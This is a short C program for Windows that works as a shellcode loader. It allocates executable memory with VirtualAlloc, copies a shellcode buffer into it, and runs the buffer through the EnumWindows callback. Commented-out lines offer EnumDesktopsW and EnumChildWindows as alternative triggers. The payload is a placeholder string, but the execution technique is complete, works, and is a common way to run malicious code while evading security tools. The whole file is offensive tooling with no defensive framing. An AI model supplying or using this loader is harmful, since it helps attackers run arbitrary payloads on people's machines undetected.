#include <windows.h>
#include <stdio.h>

/*
BOOL EnumWindows(
  [in] WNDENUMPROC lpEnumFunc,  A pointer to an application-defined callback function.
  [in] LPARAM      lParam		An application-defined value to be passed to the callback function.
);
*/

int main(int argc, char* argv[]) {
	char shellcode[] = "your shellcode here";
	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(hAlloc, shellcode, sizeof(shellcode));
	EnumWindows((WNDENUMPROC)hAlloc, NULL);

	// EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);
	// EnumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
}

